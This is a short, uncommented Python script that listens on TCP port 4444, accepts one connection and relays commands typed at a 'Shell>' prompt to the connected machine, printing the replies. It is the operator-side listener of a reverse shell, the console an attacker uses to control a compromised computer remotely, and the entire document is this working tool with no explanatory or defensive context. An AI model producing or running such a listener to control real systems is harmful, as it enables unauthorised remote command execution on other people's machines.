import socket

s = socket.socket()
s.bind(('', 4444))
s.listen(1)
conn, addr = s.accept()

while True:
    cmd = input("Shell> ")
    conn.send(cmd.encode())
    print(conn.recv(1024).decode())
